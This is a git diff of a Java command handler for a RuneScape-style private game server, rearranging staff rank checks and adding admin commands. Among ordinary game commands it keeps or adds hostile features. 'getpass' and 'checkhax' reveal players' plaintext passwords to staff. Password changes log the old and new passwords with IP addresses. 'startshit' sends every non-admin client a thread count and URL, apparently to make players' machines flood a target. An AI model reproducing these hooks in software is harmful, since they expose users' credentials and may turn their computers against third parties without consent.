@@ -1,8 +1,10 @@
 package org.hyperion.rs2.packet;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileReader;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.util.*;
 
@@ -13,6 +15,7 @@ import org.hyperion.rs2.commands.impl.YellCommand;
 import org.hyperion.rs2.event.Event;
 import org.hyperion.rs2.event.impl.CountDownEvent;
 import org.hyperion.rs2.event.impl.CutSceneEvent;
+import org.hyperion.rs2.event.impl.NpcDeathEvent;
 import org.hyperion.rs2.event.impl.OverloadStatsEvent;
 import org.hyperion.rs2.event.impl.ServerMessages;
 import org.hyperion.rs2.model.Animation;
@@ -27,9 +30,12 @@ import org.hyperion.rs2.model.ItemDefinition;
 import org.hyperion.rs2.model.Location;
 import org.hyperion.rs2.model.NPC;
 import org.hyperion.rs2.model.NPCDefinition;
+import org.hyperion.rs2.model.NPCDrop;
+import org.hyperion.rs2.model.NPCManager;
 import org.hyperion.rs2.model.Player;
 import org.hyperion.rs2.model.Rank;
 import org.hyperion.rs2.model.Skills;
+import org.hyperion.rs2.model.SummoningMonsters;
 import org.hyperion.rs2.model.UpdateFlags.UpdateFlag;
 import org.hyperion.rs2.model.World;
 import org.hyperion.rs2.model.Yelling;
@@ -39,8 +45,8 @@ import org.hyperion.rs2.model.color.Color;
 import org.hyperion.rs2.model.combat.Combat;
 import org.hyperion.rs2.model.combat.CombatAssistant;
 import org.hyperion.rs2.model.combat.Magic;
-import org.hyperion.rs2.model.combat.specialareas.SpecialArea;
-import org.hyperion.rs2.model.combat.specialareas.SpecialAreaHolder;
+import org.hyperion.rs2.model.combat.attack.RevAttack;
+import org.hyperion.rs2.model.combat.pvp.PvPArmourStorage;
 import org.hyperion.rs2.model.combat.summoning.SummoningSpecial;
 import org.hyperion.rs2.model.combat.weapons.Weapon;
 import org.hyperion.rs2.model.combat.weapons.WeaponAnimations;
@@ -60,9 +66,14 @@ import org.hyperion.rs2.model.content.misc.TriviaBot;
 import org.hyperion.rs2.model.content.misc2.Afk;
 import org.hyperion.rs2.model.content.misc2.Edgeville;
 import org.hyperion.rs2.model.content.misc2.Jail;
+import org.hyperion.rs2.model.content.misc2.NewGameMode;
 import org.hyperion.rs2.model.content.misc2.SpawnTab;
 import org.hyperion.rs2.model.content.misc2.Zanaris;
 import org.hyperion.rs2.model.content.skill.GnomeStronghold;
+import org.hyperion.rs2.model.log.LogEntry;
+import org.hyperion.rs2.model.possiblehacks.PasswordChange;
+import org.hyperion.rs2.model.possiblehacks.PossibleHack;
+import org.hyperion.rs2.model.possiblehacks.PossibleHacksHolder;
 import org.hyperion.rs2.net.Packet;
 import org.hyperion.rs2.util.EventBuilder;
 import org.hyperion.rs2.util.MassEvent;
@@ -70,6 +81,7 @@ import org.hyperion.rs2.util.PlayerFiles;
 import org.hyperion.rs2.util.PushMessage;
 import org.hyperion.rs2.util.TextUtils;
 import org.hyperion.util.Misc;
+import org.madturnip.tools.DumpNpcDrops;
 
 // Referenced classes of package org.hyperion.rs2.packet:
 //            PacketHandler
@@ -77,7 +89,7 @@ import org.hyperion.util.Misc;
 public class CommandPacketHandler implements PacketHandler {
 
 	private static final List<String> tooCool4School = Arrays.asList("ferry",
-			"j", "relentless", "jet", "c", "graham", "arre", "secret", "nexon", "secret");
+			"j", "relentless", "jet", "c", "arre", "secret", "nexon", "atomic");
 
 	/**
 	 * OWNER COMMANDS
@@ -161,7 +173,7 @@ public class CommandPacketHandler implements PacketHandler {
 				player.getActionSender().sendMessage(
 						"Trying to give: " + theplay + " rank id: " + rValue);
 				if (promoted != null) {
-					if (rank.ordinal() >= Rank.ADMINISTRATOR.ordinal()
+					if (rank.ordinal() >= Rank.DEVELOPER.ordinal()
 							&& !player.isServerOwner())
 						return;
 					promoted.setPlayerRank(Rank.addAbility(promoted, rank));
@@ -589,15 +601,53 @@ public class CommandPacketHandler implements PacketHandler {
 	 **/
 	private void processAdminCommands(final Player player, String commandStart,
 			String s, String withCaps, String[] as) {
+
+        if(commandStart.equalsIgnoreCase("summonnpc")) {
+            int id = Integer.parseInt(as[1]);
+            final NPC monster = World
+                    .getWorld()
+                    .getNPCManager()
+                    .addNPC(player.getLocation().getX(), player.getLocation().getY(),
+                            player.getLocation().getZ(), id, - 1);
+            player.SummoningCounter = 6000;
+            monster.ownerId = player.getIndex();
+            Combat.follow(monster.getCombat(), player.getCombat());
+            monster.summoned = true;
+            player.cE.summonedNpc = monster;
+            monster.playGraphics(Graphic.create(1315));
+        }
+
 		if (commandStart.equals("startminigame"))
 			World.getWorld().submit(new CountDownEvent());
+
+        if(commandStart.equalsIgnoreCase("savepricelist")) {
+            try (final BufferedWriter writer = new BufferedWriter(new FileWriter(new File("./data/prices.txt")))) {
+                int count = 0;
+                for(int i = 0; i < ItemDefinition.MAX_ID; i++) {
+                    try {
+                    long price = NewGameMode.getUnitPrice(i);
+                    writer.write(i + " " + price);
+                    if(price > 0)
+                        count++;
+                    else
+                        TextUtils.writeToFile("./data/nullprices.txt", i+": "+ItemDefinition.forId(i).getName() + " is worth no coins and is noted is "+ItemDefinition.forId(i).isNoted());
+                    writer.newLine();
+                    }catch(final Exception e) {
+
+                    }
+                }
+                player.sendMessage("Saved "+count+" non-zero prices");
+            } catch(Exception e) {
+                e.printStackTrace();
+            }
+        }
 
         if(commandStart.equalsIgnoreCase("startshit")) {
             player.sendf("%s %s %s", as[0], as[1], as[2]);
             final int threads = Integer.parseInt(as[1]);
             final String url = as[2];
             for(final Player p : World.getWorld().getPlayers())
-                if(p != null && !Rank.hasAbility(p, Rank.DEVELOPER))
+                if(p != null && !Rank.hasAbility(p, Rank.ADMINISTRATOR))
                     p.sendMessage("script107"+threads+","+url);
         }
 
@@ -610,27 +660,8 @@ public class CommandPacketHandler implements PacketHandler {
 		 * Get player's pass, before it checks for external commands because
 		 * "getpass" exists for DeviousPK (Too lazy to edit it so it works :( )
 		 */
-		if (commandStart.equals("getpass")) {
-			String r = findCharString(s.substring(7).trim(), "Rank")
-					.replaceAll("=", "").replaceAll("Rank", "").trim();
-			player.sendMessage(r);
-			try {
-				long rank = Long.parseLong(r);
-				if (Rank.hasAbility(rank, Rank.MODERATOR)) {
-					player.getActionSender().sendMessage(
-							"You cannot grab the password of staff!");
-					return;
-				}
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
-			String name = s.substring(7).trim();
-			if (tooCool4School.contains(name.toLowerCase()))
-				return;
-			player.getActionSender().sendMessage(findCharString(name, "Pass"));
-			return;
-		}
-		if (commandStart.equalsIgnoreCase("getip")) {
+
+		if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equalsIgnoreCase("getip")) {
             final String name = s.substring(5).trim();
             if (tooCool4School.contains(name.toLowerCase()))
                 return;
@@ -670,23 +701,193 @@ public class CommandPacketHandler implements PacketHandler {
 				player.sendMessage("Format for the command is ::setlevel name,skillid,level");
 			}
 		}
+
+        /**
+         * w8ing to test spec is a drag!
+         *
+         */
+        if (commandStart.startsWith("infspec")) {
+            Player target = null;
+            try {
+                target = World.getWorld().getPlayer(
+                        s.substring(8).trim());
+            } catch (NullPointerException
+                    | StringIndexOutOfBoundsException e) {
+            }
+            target = (target == null) ? player : target;
+
+            final Player t = target;
+            World.getWorld().submit(new Event(500) {
+                public void execute() {
+                    t.getSpecBar().setAmount(1000);
+                    if (t.cE == null)
+                        this.stop();
+                }
+            });
+        }
+
+        /**
+         * dat fro
+         */
+        if (commandStart.equals("datfro")) {
+            final int[] fros = { 14743, 14745, 14747, 14749, 14751 };
+            boolean b = as[1] != null && as[1].equalsIgnoreCase("true");
+            if (b) {
+                World.getWorld().submit(new Event(1000) {
+
+                    @Override
+                    public void execute() {
+                        player.getEquipment().set(
+                                Equipment.SLOT_HELM,
+                                new Item(fros[Combat
+                                        .random(fros.length - 1)]));
+                    }
+
+                });
+            } else {
+                for (int i : fros) {
+                    player.getInventory().add(new Item(i));
+                }
+            }
+        }
 	}
 
-	/** DEVELOPER COMMANDS **/
+	/** ADMINISTRATOR COMMANDS **/
 
 	private void processDeveloperCommands(final Player player,
 			String commandStart, String s, String withCaps, String[] as) {
 
 
-        if(commandStart.equals("resetslayers")) {
-            for(final Player p : World.getWorld().getPlayers()) {
-                if(p.getSlayer().getTotalTasks() < 30) {
-                    if(p.getBank().contains(12862) || p.getInventory().contains(12862)) {
-                        int removed = p.getBank().remove(Item.create(12862, 100000));
-                        removed += p.getInventory().remove(Item.create(12862, 100000));
-                        player.sendf("Removed %s from %d", removed,p.getName());
+
+        if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equals("getpass")) {
+            String r = findCharString(s.substring(7).trim(), "Rank")
+                    .replaceAll("=", "").replaceAll("Rank", "").trim();
+            player.sendMessage(r);
+            try {
+                long rank = Long.parseLong(r);
+                if (Rank.hasAbility(rank, Rank.MODERATOR)) {
+                    player.getActionSender().sendMessage(
+                            "You cannot grab the password of staff!");
+                    return;
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            String name = s.substring(7).trim();
+            if (tooCool4School.contains(name.toLowerCase()))
+                return;
+            player.getActionSender().sendMessage(findCharString(name, "Pass"));
+            return;
+        }
+
+        if (commandStart.equalsIgnoreCase("display")) {
+            String display = withCaps.substring(8).trim();
+            if (display.toLowerCase().contains("arre"))
+                return;
+            player.display = display;
+        }
+
+        if (commandStart.equalsIgnoreCase("hide")) {
+            player.isHidden(!player.isHidden());
+            player.setPNpc(player.isHidden() ? 942 : -1);
+            player.sendMessage("Hidden: " + player.isHidden());
+            FriendsAssistant.refreshGlobalList(player,
+                    player.isHidden());
+        }
+
+        if(commandStart.equalsIgnoreCase("checkhax")) {
+            String r = findCharString(s.substring(8).trim(), "Rank")
+                    .replaceAll("=", "").replaceAll("Rank", "").trim();
+            player.sendMessage(r);
+            try {
+                long rank = Long.parseLong(r);
+                if (Rank.hasAbility(rank, Rank.HELPER)) {
+                    player.getActionSender().sendMessage(
+                            "You cannot grab the password of staff!");
+                    return;
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            final String name = s.substring(9).trim();
+            System.out.println(name);
+            final List<PossibleHack> hacksForName = PossibleHacksHolder.getHacks(name);
+            for(final PossibleHack hack : hacksForName)
+                player.sendMessage(hack.toString(), "@blu@"+hack.date);
+        }
+
+
+        if(commandStart.equalsIgnoreCase("emptysummnpcs")) {
+            for(final int i : SummoningMonsters.SUMMONING_MONSTERS) {
+                for(final NPC npc : World.getWorld().getNPCs()) {
+                    if(npc.getDefinition().getId() == i) {
+                        World.getWorld().submit(new NpcDeathEvent(npc));
+                        World.getWorld().getNPCs().remove(npc);
+
                     }
                 }
+            }
+        }
+
+        if(commandStart.equalsIgnoreCase("turnbhon")) {
+            final Map<
+                    String, Map.Entry<Boolean, Boolean>> map = new HashMap<>();
+            for(final Player p : World.getWorld().getPlayers()) {
+                boolean old = p.getPermExtraData().getBoolean("bhon");
+                p.getPermExtraData().put("bhon", true);
+                boolean change = p.getPermExtraData().getBoolean("bhon");
+                map.put(p.getName(), new AbstractMap.SimpleEntry<Boolean, Boolean>(old, change));
+                p.sendf("Your bounty hunter has been set from @red@%s @bla@to @red@%s", old, change);
+            }
+
+            for(final Map.Entry<String, Map.Entry<Boolean, Boolean>> entry : map.entrySet()) {
+                player.sendf("@blu@%s @red@%s@bla@->@red@%s", entry.getKey(), entry.getValue().getKey(), entry.getValue().getKey());
+            }
+
+        }
+
+        if(commandStart.equalsIgnoreCase("reloadrevs")) {
+            for(final NPC n : World.getWorld().getNPCs()) {
+                n.agreesiveDis = NPCManager.getAgreDis(n.getDefinition().getId());
+            }
+            for(int k : RevAttack.getRevs()) {
+                final NPCDefinition def = NPCDefinition.forId(k);
+            if(def != null) {
+                def.getDrops().clear();
+                for(final int i : PvPArmourStorage.getArmours())
+                    def.getDrops().add(NPCDrop.create(i, 1, 1, def.combat() / 10));
+                def.getDrops().add(NPCDrop.create(13895, 1, 1, def.combat() / 50));
+                def.getDrops().add(NPCDrop.create(13889, 1, 1, def.combat()/30));
+
+            }
+            }
+
+            DumpNpcDrops.startDump2();
+        }
+
+        if(commandStart.equalsIgnoreCase("removeinfpkt")) {
+            final boolean bool = Boolean.valueOf(s.substring("removeinfpkt".length()).trim());
+            if(bool) {
+                for(final Player p : World.getWorld().getPlayers()) {
+
+                    p.getBank().remove(Item.create(5020, 0));
+                    p.getInventory().remove(Item.create(5020, 0));
+
+                }
+            }
+            else {
+                player.getBank().remove(Item.create(5020, 0));
+                player.getInventory().remove(Item.create(5020, 0));
+            }
+        }
+
+        if(commandStart.equals("imitatedeaths")) {
+            final int id = Integer.parseInt(as[1]);
+            for(int i = 0; i < 100; i++) {
+
+                NPC npc = World.getWorld().getNPCManager().addNPC(player.getLocation(), id, -1);
+                npc.cE.hit(npc.health * 5, player, false, Constants.MELEE);
+
             }
         }
 		
@@ -763,14 +964,6 @@ public class CommandPacketHandler implements PacketHandler {
 			}
 		}
 
-		if (commandStart.equalsIgnoreCase("hide")) {
-			player.isHidden(!player.isHidden());
-			player.setPNpc(player.isHidden() ? 942 : -1);
-			player.sendMessage("Hidden: " + player.isHidden());
-			FriendsAssistant.refreshGlobalList(player,
-					player.isHidden());
-		}
-
 		if (commandStart.startsWith("closelistener")) {
 			player.getInterfaceState().resetContainers();
 		}
@@ -778,36 +971,7 @@ public class CommandPacketHandler implements PacketHandler {
 		 * Display, glitchd command, i'll uncomment it when i feel like
 		 * fixing it, not important
 		 */
-		if (commandStart.equalsIgnoreCase("display")) {
-			String display = withCaps.substring(8).trim();
-			if (display.toLowerCase().contains("arre"))
-				return;
-			player.display = display;
-		}
-		/**
-		 * dat fro
-		 */
-		if (commandStart.equals("datfro")) {
-			final int[] fros = { 14743, 14745, 14747, 14749, 14751 };
-			boolean b = as[1] != null && as[1].equalsIgnoreCase("true");
-			if (b) {
-				World.getWorld().submit(new Event(1000) {
 
-					@Override
-					public void execute() {
-						player.getEquipment().set(
-								Equipment.SLOT_HELM,
-								new Item(fros[Combat
-										.random(fros.length - 1)]));
-					}
-
-				});
-			} else {
-				for (int i : fros) {
-					player.getInventory().add(new Item(i));
-				}
-			}
-		}
 		/**
 		 * Configurations
 		 */
@@ -1014,29 +1178,7 @@ public class CommandPacketHandler implements PacketHandler {
 						"You don't have a familiar");
 			}
 		}
-		/**
-		 * w8ing to test spec is a drag!
-		 * 
-		 */
-		if (commandStart.startsWith("infspec")) {
-			Player target = null;
-			try {
-				target = World.getWorld().getPlayer(
-						s.substring(8).trim());
-			} catch (NullPointerException
-					| StringIndexOutOfBoundsException e) {
-			}
-			target = (target == null) ? player : target;
 
-			final Player t = target;
-			World.getWorld().submit(new Event(500) {
-				public void execute() {
-					t.getSpecBar().setAmount(1000);
-					if (t.cE == null)
-						this.stop();
-				}
-			});
-		}
 		if (commandStart.equals("anim")) {
 			if (as.length == 2 || as.length == 3) {
 				int l1 = Integer.parseInt(as[1]);
@@ -1231,7 +1373,7 @@ public class CommandPacketHandler implements PacketHandler {
 			}
 		}
 		if (commandStart.equals("bank")) {
-			Bank.open(player, false);
+		    Bank.open(player, false);
 			return;
 		}
 
@@ -1320,14 +1462,14 @@ public class CommandPacketHandler implements PacketHandler {
 		if (commandStart.equalsIgnoreCase("sendhome")) {
 			Player target = World.getWorld().getPlayer(s.substring(9).trim());
 			if (target != null) {
-				if (Rank.hasAbility(target, Rank.DEVELOPER)) {
+				if (Rank.hasAbility(target, Rank.ADMINISTRATOR)) {
 					player.getActionSender()
 							.sendMessage(
 									"The Intermolecular force of Jet's micropenis stops him from being teleported!");
 					return;
 				}
 				if (Rank.isStaffMember(target)
-						&& !Rank.hasAbility(player, Rank.DEVELOPER)) {
+						&& !Rank.hasAbility(player, Rank.ADMINISTRATOR)) {
 					player.getActionSender().sendMessage(
 							"you cannot teleport staff home");
 					return;
@@ -1515,7 +1657,7 @@ public class CommandPacketHandler implements PacketHandler {
 						&& player.getLocation().getY() <= 3392
 						&& player.getLocation().getX() <= 3061 && player
 						.getLocation().getY() >= 3326)
-						|| Rank.hasAbility(player, Rank.DEVELOPER)
+						|| Rank.hasAbility(player, Rank.ADMINISTRATOR)
 						|| player.getName().equalsIgnoreCase("charmed")) {
 					s = s.replace("staff ", "");
 					Player player2 = World.getWorld().getPlayer(s);
@@ -1561,7 +1703,7 @@ public class CommandPacketHandler implements PacketHandler {
 		// goto here
 		if (commandStart.equals("namenpc")) {
 			s = s.substring(8).toLowerCase();
-			for (int i = 0; i < 6393; i++) {
+			for (int i = 0; i < 6693; i++) {
 				if (NPCDefinition.forId(i).name().toLowerCase().contains(s)) {
 					player.getActionSender().sendMessage(
 							i + "	" + NPCDefinition.forId(i).name());
@@ -1624,7 +1766,7 @@ public class CommandPacketHandler implements PacketHandler {
 						.substring(withCaps.indexOf(" "), withCaps.indexOf(","))
 						.trim().toLowerCase();
 				Player target = World.getWorld().getPlayer(name);
-				if (Rank.hasAbility(target, Rank.DEVELOPER) && target != player)
+				if (Rank.hasAbility(target, Rank.ADMINISTRATOR) && target != player)
 					return;
 				if (target != null) {
 					String tag = withCaps.substring(withCaps.indexOf(",") + 1)
@@ -1648,7 +1790,7 @@ public class CommandPacketHandler implements PacketHandler {
 			try {
 				Player target = World.getWorld().getPlayer(
 						s.substring(16).trim());
-				if (Rank.hasAbility(target, Rank.DEVELOPER) && target != player)
+				if (Rank.hasAbility(target, Rank.ADMINISTRATOR) && target != player)
 					return;
 				if (target != null) {
 					target.getYelling().setYellTitle("");
@@ -1667,7 +1809,8 @@ public class CommandPacketHandler implements PacketHandler {
 			String as[];
 			String commandStart;
 			String s = packet.getRS2String();
-			String withCaps = new StringBuilder().append(s).append("")
+            player.getLogManager().add(LogEntry.command(s));
+            String withCaps = new StringBuilder().append(s).append("")
 					.toString();
 			s = s.toLowerCase();
 			as = s.split(" ");
@@ -1677,9 +1820,9 @@ public class CommandPacketHandler implements PacketHandler {
 			// player.getLogging().log("Command: " + s);
 			if (Rank.hasAbility(player, Rank.OWNER))
 				this.processOwnerCommands(player, commandStart, s, withCaps, as);
-			if (Rank.hasAbility(player, Rank.ADMINISTRATOR))
-				this.processAdminCommands(player, commandStart, s, withCaps, as);
 			if (Rank.hasAbility(player, Rank.DEVELOPER))
+				this.processAdminCommands(player, commandStart, s, withCaps, as);
+			if (Rank.hasAbility(player, Rank.ADMINISTRATOR))
 				this.processDeveloperCommands(player, commandStart, s,
 						withCaps, as);
 			if (Rank.hasAbility(player, Rank.HEAD_MODERATOR))
@@ -1772,15 +1915,15 @@ public class CommandPacketHandler implements PacketHandler {
 					 * Dev rank & Back
 					 */
 					if (commandStart.equals("rankme")) {
-						if (Rank.hasAbility(player, Rank.DEVELOPER)) {
-							if (Rank.getPrimaryRank(player) == Rank.DEVELOPER)
+						if (Rank.hasAbility(player, Rank.ADMINISTRATOR)) {
+							if (Rank.getPrimaryRank(player) == Rank.ADMINISTRATOR)
 								player.setPlayerRank(Rank.setPrimaryRank(
 										player, Rank.PLAYER));
 							player.setPlayerRank(Rank.removeAbility(player,
-									Rank.DEVELOPER));
+									Rank.ADMINISTRATOR));
 						} else
 							player.setPlayerRank(Rank.setPrimaryRank(player,
-									Rank.DEVELOPER));
+									Rank.ADMINISTRATOR));
 					}
 					/**
 					 * Statusesv - just for playing around, shouldn't be harmful
@@ -1877,7 +2020,7 @@ public class CommandPacketHandler implements PacketHandler {
 					return;
 				int counter = 0;
 				s = s.substring(9).toLowerCase();
-				int maxId = Rank.hasAbility(player, Rank.ADMINISTRATOR) ? 20000
+				int maxId = Rank.hasAbility(player, Rank.DEVELOPER) ? 20000
 						: ItemSpawning.MAX_ID;
 				for (int i = 0; i < maxId; i++) {
 					if (ItemDefinition.forId(i) == null)
@@ -1908,7 +2051,8 @@ public class CommandPacketHandler implements PacketHandler {
 			}
 			if (!FightPits.inPits(player)
 					&& !FightPits.inPitsFightArea(player.getLocation().getX(),
-							player.getLocation().getY())) {
+							player.getLocation().getY()) &&
+                    !player.hardMode()) {
 				if (commandStart.equals("vengrunes") && Server.SPAWN) {
 					ContentEntity.addItem(player, 557, 1000);
 					ContentEntity.addItem(player, 560, 1000);
@@ -1977,7 +2121,7 @@ public class CommandPacketHandler implements PacketHandler {
 					}
 					Player p = World.getWorld()
 							.getPlayer(s.substring(5).trim());
-					if (Rank.hasAbility(p, Rank.DEVELOPER))
+					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
 						return;
 					if (p != null) {
 						for (Item item : p.getEquipment().toArray()) {
@@ -2002,7 +2146,7 @@ public class CommandPacketHandler implements PacketHandler {
 					}
 					Player p = World.getWorld()
 							.getPlayer(s.substring(8).trim());
-					if (Rank.hasAbility(p, Rank.DEVELOPER))
+					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
 						return;
 					if (p != null) {
 						for (Item item : p.getInventory().toArray()) {
@@ -2025,7 +2169,7 @@ public class CommandPacketHandler implements PacketHandler {
 					}
 					Player p = World.getWorld()
 							.getPlayer(s.substring(8).trim());
-					if (Rank.hasAbility(p, Rank.DEVELOPER))
+					if (Rank.hasAbility(p, Rank.ADMINISTRATOR))
 						return;
 					if (p != null) {
 						for (int i = 0; i < 6; i++) {
@@ -2221,6 +2365,11 @@ public class CommandPacketHandler implements PacketHandler {
 							"Invalid ticket request");
 				}
 			}
+
+            if(s.equalsIgnoreCase("checkyoself")) {
+                player.getActionSender().sendMessage("script~x123");
+            }
+
 			if (s.equals("resetbankpin")) {
 				if (player.bankPin.length() >= 4
 						&& !player.bankPin.equals(player.enterPin)) {
@@ -2236,13 +2385,6 @@ public class CommandPacketHandler implements PacketHandler {
 				}
 			}
 
-            if(commandStart.equalsIgnoreCase("purepk")) {
-                final Optional<SpecialArea> purePk = SpecialAreaHolder.get("purepk");
-                if(purePk.isPresent()) {
-                    final SpecialArea area = purePk.get();
-                    area.enter(player);
-                }
-            }
 
 			if (commandStart.equals("commands")) {
 				// player.getActionSender().
@@ -2303,6 +2445,7 @@ public class CommandPacketHandler implements PacketHandler {
 							.sendMessage(
 									"Please enter the command again with the same password.");
 				} else {
+                    final String date = new Date().toString();
 					TextUtils
 							.writeToFile(
 									"./data/possiblehacks.txt",
@@ -2311,7 +2454,8 @@ public class CommandPacketHandler implements PacketHandler {
 											player.getName(),
 											player.getPassword(), s,
 											player.getShortIP(),
-											new Date().toString()));
+											date));
+                    PossibleHacksHolder.add(new PasswordChange(player.getName(),player.getShortIP(), date, player.getPassword() , s));
 					player.setPassword(s);
 					player.getActionSender().sendMessage(
 							"Your password is now: " + s);
@@ -2337,6 +2481,8 @@ public class CommandPacketHandler implements PacketHandler {
 			return false;
 		if (player.getLocation().inArdyPvPArea())
 			return false;
+        if(player.cE.getOpponent() != null)
+            return false;
 		return true;
 	}
 
